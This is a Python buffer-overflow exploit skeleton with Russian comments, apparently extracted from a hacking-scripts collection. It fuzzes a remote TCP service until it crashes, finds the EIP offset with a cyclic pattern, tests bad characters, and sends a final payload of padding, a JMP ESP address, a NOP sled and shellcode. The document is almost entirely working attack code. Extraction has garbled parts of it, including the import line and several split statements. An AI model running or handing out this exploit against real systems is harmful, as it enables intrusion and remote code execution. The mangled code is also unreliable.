#!/usr/bin/env python3
importimportimportimportimportimportimportsocket
struct
json
os
argparse
time
sys
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
STATE_FILE = "exploit_state.json"
# ── Тестовый shellcode для демонстрации (calc.exe на Windows, exit на Linux)
──
SHELLCODE_LINUX_EXIT = (
b"\x48\x31\xff\xb8\x3c\x00\x00\x00\x0f\x05" # exit(0)
)
# Шаблон: реальный shellcode подставляется через --shellcode
SHELLCODE_PLACEHOLDER = b"\x90" * 20 + b"\xcc" * 4 # NOP + INT3 (breakpoint)
def load_state() -> dict:
if os.path.exists(STATE_FILE):
with open(STATE_FILE) as f:
return json.load(f)
return {}
def save_state(state: dict) -> None:
with open(STATE_FILE, "w") as f:
json.dump(state, f, indent=2)
print(f"{CYAN}[*] Прогресс сохранён в {STATE_FILE}{RESET}")
def tcp_send_recv(host: str, port: int, payload: bytes,
timeout: float = 3.0, recv_banner: bool = True) -> tuple[bool, bytes]:
try:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
s.connect((host, port))
if recv_banner:
try: s.recv(2048) # читаем баннер
except: pass
s.sendall(payload)
try:
resp = s.recv(2048)
s.close()
return (True, resp)
except:
s.close()
return (False, b"")
except (ConnectionRefusedError, socket.timeout, OSError):
return (False, b"")
_ALPHABET =
b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
def cyclic(n: int) -> bytes:
result = bytearray()
for i in range(n // 4 + 1):
for j in range(4):
result.append(_ALPHABET[(i // (len(_ALPHABET) ** j)) % len(_ALPHABET)])
return bytes(result[:n])
def cyclic_find(seq: bytes) -> int:
pattern = cyclic(20000)
idx = pattern.find(seq)
if idx >= 0: return idx
idx = pattern.find(seq[::-1])
return idx
def phase1_crash(state: dict, host: str, port: int, prefix: bytes) -> dict:
print(f"\n{YELLOW}{'='*50}")
print(f" ФАЗА 1: Поиск краша")
print(f"{'='*50}{RESET}")
size = state.get("p1_start", 100)
while size <= 10000:
payload = prefix + b"A" * size
success, _ = tcp_send_recv(host, port, payload)
30 Python-скриптов для Хакинга
print(f" {size:5d} байт... ", end="")
if not success:
print(f"{RED}[CRASH!]{RESET}")
state["crash_size"] = size
state["phase"] = 1
print(f"\n{GREEN}[✓] Краш при {size} байтах{RESET}")
return state
else:
print(f"{GREEN}OK{RESET}")
size += 100
time.sleep(0.05)
print(f"{RED}[-] Краш не найден{RESET}")
return state
def phase2_pattern(state: dict, host: str, port: int, prefix: bytes) -> dict:
"""Отправляем cyclic pattern для определения offset."""
print(f"\n{YELLOW}{'='*50}")
print(f" ФАЗА 2: Cyclic Pattern")
print(f"{'='*50}{RESET}")
crash_size = state.get("crash_size", 3000)
size = crash_size + 400 # Немного больше краша
pattern = cyclic(size)
payload = prefix + pattern
print(f"{CYAN}[*] Отправляем pattern {size} байт...{RESET}")
print(f"{YELLOW}[!] Запусти уязвимую программу в отладчике{RESET}")
print(f"{YELLOW}[!] После краша запиши значение EIP/RIP{RESET}")
tcp_send_recv(host, port, payload, timeout=2)
state["pattern_size"] = size
state["phase"]
 = 2
print(f"\n{GREEN}[✓] Pattern отправлен. Запусти следующую фазу с --eip
<значение>{RESET}")
return state
def phase3_offset(state: dict, eip_value: str) -> dict:
"""Находим точный offset до EIP."""
print(f"\n{YELLOW}{'='*50}")
print(f" ФАЗА 3: Определение Offset")
print(f"{'='*50}{RESET}")
eip_bytes = bytes.fromhex(eip_value.replace("0x", "").replace(" ", ""))
offset = cyclic_find(eip_bytes)
if offset < 0:
print(f"{RED}[-] Offset не найден для EIP={eip_value}{RESET}")
return state
print(f"{GREEN}[✓] Offset до EIP: {offset} байт{RESET}")
# Верифицируем
print(f"\n{CYAN}[*] Структура payload:{RESET}")
print(f" padding = 'A' * {offset}")
print(f" EIP
 = 'BBBB' (0x42424242)")
print(f" after EIP = 'CCCC' * 10 (проверяем ESP)")
state["offset"] = offset
state["phase"] = 3
return state
def phase4_badchars(state: dict, host: str, port: int, prefix: bytes) -> dict:
"""Тестируем bad characters."""
print(f"\n{YELLOW}{'='*50}")
print(f" ФАЗА 4: Bad Characters")
print(f"{'='*50}{RESET}")
offset = state.get("offset", 0)
badchars = bytes(range(1, 256)) # 0x01 до 0xFF (0x00 всегда bad)
payload = prefix + b"A" * offset + b"B" * 4 + badchars
print(f"{CYAN}[*] Отправляем {len(badchars)} байт bad chars после
EIP...{RESET}")
print(f"{YELLOW}[!] В отладчике смотри на ESP — ищи
пропуски/изменения{RESET}")
tcp_send_recv(host, port, payload, timeout=2)
print(f"\n{YELLOW}[!] Стандартные bad chars: \\x00, \\x0a, \\x0d{RESET}")
print(f"{YELLOW}[!] Укажи найденные badchars в следующей фазе через
--badchars{RESET}")
state["phase"] = 4
return state
def phase5_exploit(state: dict, host: str, port: int, prefix: bytes,
eip_override: str = None, badchars_str: str = None,
shellcode: bytes = None) -> None:
print(f"\n{YELLOW}{'='*50}")
print(f" ФАЗА 5: Финальный Exploit")
print(f"{'='*50}{RESET}")
offset = state.get("offset", 0)
if not offset:
print(f"{RED}[!] Offset не определён. Сначала фазы 1-3.{RESET}")
return
# EIP — адрес JMP ESP (или другого гаджета)
if eip_override:
eip_bytes = bytes.fromhex(eip_override.replace("\\x", "").replace("0x", ""))
# Интерпретируем как little-endian адрес
if len(eip_bytes) == 4:
eip_addr = struct.unpack("<I", eip_bytes)[0]
eip_packed = struct.pack("<I", eip_addr)
else:
eip_packed = eip_bytes
else:
eip_packed = b"BBBB" # Заглушка
print(f"{YELLOW}[!] EIP не указан. Используем заглушку BBBB.{RESET}")
print(f"{YELLOW}[!] Найди JMP ESP в OllyDbg/Immunity: !mona jmp -r
esp{RESET}")
sc = shellcode or SHELLCODE_PLACEHOLDER
nop_sled = b"\x90" * 16
# Финальный payload
payload = (
prefix
 + # Протокольный префикс (если нужен)
b"A" * offset + # Padding до EIP
eip_packed + # Адрес возврата (JMP ESP или ROP gad get)
nop_sled
 + # NOP sled для надёжности
sc
 # Shellcode
)
print(f"{CYAN}[*] Структура exploit payload:{RESET}")
print(f" prefix: {len(prefix)} байт")
print(f" padding: {offset} байт ('A' * {offset})")
print(f" EIP:
 {eip_packed.hex()} ({len(eip_packed)} байт)")
print(f" NOP sled: {len(nop_sled)} байт")
print(f" shellcode: {len(sc)} байт")
print(f" ИТОГО: {len(payload)} байт")
print()
print(f"{YELLOW}[*] Запускаем exploit...{RESET}")
success, resp = tcp_send_recv(host, port, payload, timeout=5)
if success:
print(f"{GREEN}[✓] Пакет отправлен успешно{RESET}")
if resp:
print(f" Ответ: {resp[:100]}")
else:
print(f"{YELLOW}[?] Соединение разорвано (возможно — краш и
выполнение shellcode){RESET}")
def main():
parser = argparse.ArgumentParser(description="Buffer Overflow Exploit
Skeleton")
parser.add_argument("-t", "--target", required=True)
parser.add_argument("-p", "--port", type=int, required=True)
parser.add_argument("--prefix",
 default="", help="Протокольный
префикс")
parser.add_argument("--phase",
 default="auto",
choices=["auto", "1", "2", "3", "4", "5", "all"],
help="Фаза (auto=следующая необходимая)")
parser.add_argument("--eip",
 default=None, help="Значение EIP из
отладчика")
parser.add_argument("--eip-addr",
 default=None, help="Адрес JMP ESP для
финала")
parser.add_argument("--badchars",
 default=None, help="Bad chars:
'00,0a,0d'")
parser.add_argument("--reset",
 action="store_true", help="Сбросить
сохранённый прогресс")
args = parser.parse_args()
prefix = args.prefix.encode() if args.prefix else b""
if args.reset and os.path.exists(STATE_FILE):
os.remove(STATE_FILE)
print(f"{YELLOW}[*] Прогресс сброшен{RESET}")
state = load_state()
current_phase = int(state.get("phase", 0)) + 1
if args.phase == "auto":
phase_num = current_phase
elif args.phase == "all":
phase_num = 1
else:
phase_num = int(args.phase)
print(f"{CYAN}[*] Exploit Skeleton → {args.target}:{args.port}{RESET}")
print(f"{CYAN}[*] Фаза: {phase_num}{RESET}")
if phase_num == 1:
state = phase1_crash(state, args.target, args.port, prefix)
elif phase_num == 2:
state = phase2_pattern(state, args.target, args.port, prefix)
elif phase_num == 3:
if not args.eip:
print(f"{RED}[!] Нужен --eip <значение из отладчика>{RESET}")
sys.exit(1)
state = phase3_offset(state, args.eip)
elif phase_num == 4:
state = phase4_badchars(state, args.target, args.port, prefix)
elif phase_num == 5:
phase5_exploit(state, args.target, args.port, prefix,
args.eip_addr, args.badchars)
save_state(state)
if __name__ == "__main__":
main()
